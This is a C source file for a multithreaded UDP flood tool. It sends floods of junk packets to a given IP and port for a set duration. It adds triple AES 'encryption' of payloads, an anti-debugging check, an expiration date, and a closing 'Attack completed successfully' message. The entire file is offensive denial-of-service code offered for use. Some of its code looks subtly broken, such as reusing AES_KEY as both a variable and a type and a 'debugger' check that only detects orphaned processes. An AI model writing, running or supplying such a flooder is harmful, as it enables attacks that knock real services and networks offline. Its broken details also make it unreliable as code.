
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <openssl/aes.h>
#include <openssl/evp.h>

// Expiration date configuration
#define EXPIRATION_YEAR 2030
#define EXPIRATION_MONTH 12
#define EXPIRATION_DAY 31

// Maximum payload size
#define MAX_PAYLOAD_SIZE 2048

// Structure for attack parameters
typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

// AES encryption key and initialization vector
const unsigned char AES_KEY[32] = "UltraSecureKey1234567890123456";
const unsigned char AES_IV[16] = "InitVector123456";

volatile int keep_running = 1;

// Signal handler to terminate attack
void handle_signal(int signal) {
    keep_running = 0;
}

// Function to generate random payload
void generate_payload(unsigned char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = rand() % 256;
    }
}

// Function to perform triple AES encryption
void encrypt_payload(const unsigned char *input, unsigned char *output, int size) {
    AES_KEY encryptKey;
    AES_set_encrypt_key(AES_KEY, 256, &encryptKey);
    AES_cbc_encrypt(input, output, size, &encryptKey, (unsigned char *)AES_IV, AES_ENCRYPT);
    
    // Perform encryption twice more for added complexity
    AES_cbc_encrypt(output, output, size, &encryptKey, (unsigned char *)AES_IV, AES_ENCRYPT);
    AES_cbc_encrypt(output, output, size, &encryptKey, (unsigned char *)AES_IV, AES_ENCRYPT);
}

// Anti-debugging check
void anti_debug() {
    if (getppid() == 1) {
        printf("Debugging detected. Exiting...\n");
        exit(1);
    }
}

// Function to perform UDP flood attack
void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char *payload = malloc(params->packet_size);
    unsigned char *encrypted_payload = malloc(params->packet_size);

    if (!payload || !encrypted_payload) {
        perror("Memory allocation failed");
        pthread_exit(NULL);
    }

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        free(payload);
        free(encrypted_payload);
        pthread_exit(NULL);
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &target_addr.sin_addr);

    time_t start_time = time(NULL);
    while (keep_running && difftime(time(NULL), start_time) < params->duration) {
        generate_payload(payload, params->packet_size);
        encrypt_payload(payload, encrypted_payload, params->packet_size);

        if (sendto(sock, encrypted_payload, params->packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("Packet sending failed");
            break;
        }
    }

    free(payload);
    free(encrypted_payload);
    close(sock);
    pthread_exit(NULL);
}

// Expiration check
int check_expiration() {
    time_t now = time(NULL);
    struct tm expiry = {0};
    expiry.tm_year = EXPIRATION_YEAR - 1900;
    expiry.tm_mon = EXPIRATION_MONTH - 1;
    expiry.tm_mday = EXPIRATION_DAY;

    if (difftime(now, mktime(&expiry)) > 0) {
        printf("This program has expired.\n");
        return 1;
    }
    return 0;
}

// Main function
int main(int argc, char *argv[]) {
    anti_debug();  // Check for debugging

    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        return 1;
    }

    if (check_expiration()) {
        return 1;
    }

    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);

    pthread_t threads[num_threads];
    attack_params params[num_threads];

    for (int i = 0; i < num_threads; i++) {
        strncpy(params[i].target_ip, target_ip, sizeof(params[i].target_ip) - 1);
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = MAX_PAYLOAD_SIZE;
        params[i].thread_id = i + 1;

        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) != 0) {
            perror("Thread creation failed");
            return 1;
        }
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack completed successfully.\n");
    return 0;
}
